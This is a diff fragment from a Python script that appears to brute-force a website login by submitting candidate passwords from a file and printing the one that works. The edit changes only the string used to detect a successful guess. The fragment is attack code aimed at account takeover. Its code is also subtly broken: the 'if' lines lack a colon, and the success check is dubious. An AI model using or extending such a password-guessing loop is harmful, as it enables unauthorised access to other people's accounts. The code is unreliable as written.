@@ -47,7 +47,7 @@ while file:
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
-			if 'pass' in response_data 
+			if 'find passw' in response_data 
 				print('Your password is : ',passw)
 				break
 	except:
